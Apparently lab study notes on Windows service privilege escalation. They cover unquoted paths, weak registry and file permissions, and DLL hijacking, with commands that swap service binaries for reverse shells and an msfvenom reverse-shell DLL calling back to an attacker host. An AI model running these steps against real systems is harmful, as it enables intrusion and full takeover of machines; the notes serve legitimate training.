Service Exploits


Service Commands:

Query the configuration			sc.exe qc <name>
	
Query the current status 		sc.exe query <name>

Modify a configuration option		sc.exe config <name> <option>= <value>

Start/Stop a service:			net start/stop <name>

Check the current values of registry	reg query <path>


Types:

1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking
______________________________________________________________________________

1. Insecure Service Properties

If we can change the config of a service but not start/stop we cannot exploit it.


Step 1: Run winPEAS with serviceinfo or with accesschk and identify the vuln service

	winPEASany.exe quiet servicesinfo
	.\accesschk.exe /accepteula -uwcqv user daclsvc

Step 2: check the config with above service command.

step 3: Change the binary path of the service with our reverse shell.

step 4: Now start the service. we will get a reverse shell.

______________________________________________________________________________

2. Unquoted Service Path

C:\Program Files\Some Dir\SomeProgram.exe

In the Unquoted Service Path the C:\Program is the executable and remaining are aruments.
It will search each each possibility of the argument.  

Step 1: Run winPEAS with serviceinfo, identify the Unquoted Service Path vuln and confirm
	with service config.

Step 2: Check for write permissions in each folder in the path.

	.\accesschk.exe /accepteula -uwdq <path>

Step 3: Create a reverse shell file in the writeable folder with the same name that after ending with 
	the \.
	
Step 4: Now start the service. we will get a reverse shell.


______________________________________________________________________________

3. Weak Registry Permissions

In this we are able to modify the registry entry of a service.

Step 1: Run winPEAS with serviceinfo, identify the Weak Registry Permissions vuln

Step 2:	Confirm with Powershell and accesschk
	
	Get-Acl <path> | Format-List
	.\accesschk.exe /accepteula -uvwqk <path>

Step 3: Now check the current values or config of registry from the above service commands.
	identify the path.

Step 4: Overwrite the Registry key with our reverseshell

	reg add  <path> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

Step 5: Now start the service. we will get a reverse shell.

______________________________________________________________________________

4. Insecure Service Executables

Original Service Executable is writable by any user. We will replace our reverse shell 
with the original. create a backup file of original in real system exploit.

Step 1: Run winPEAS with serviceinfo, identify the File permission everyone.

Step 2:	Confirm with  accesschk
	
	.\accesschk.exe /accepteula -quvw <path>

Step 3: Create a backup of the original service executable

	copy <path_of_executable> <path_to_save>

Step 4: Overwrite the original executable with our reverse shell

	copy /Y <reverse_shell_path> <path>

Step 5: Now start the service. we will get a reverse shell.

______________________________________________________________________________

5. DLL Hijacking

Service may uses DLL's. It will be executed with with the same privileges as the
service that loaded it. if we can write to that folder we will replace with our 
reverse shell.

One more misconfig is DLL is missing from the system where that folder is user writable.
we will replace with our reverse shell. (for this in we need to copy that service executable 
to our our system and run with admin privliages and analyze the file paths it is taking with 
procmon tool)


Step 1: Run winPEAS with serviceinfo, identify the DLL Hijack Service.

Step 2:	Confirm with accesschk
	
	.\accesschk.exe /accepteula -quvw <path>

Step 3: Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.

Step 4: Add a new filter on the Process Name matching

Step 5: On the main screen, deselect registry activity and network activity

Step 6: Start the service.

Step 7: Now analyze the procmon and note the NAME NOT FOUND error associated with the original 
	executable name.

Step 8: generate a reverse shell DLL named hijackme.dll
	
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f dll -o hijackme.dll

Step 9: Copy the DLL file into associated folder. 

Step 10: Now restart the service by stop and start. we will get a reverse shell.

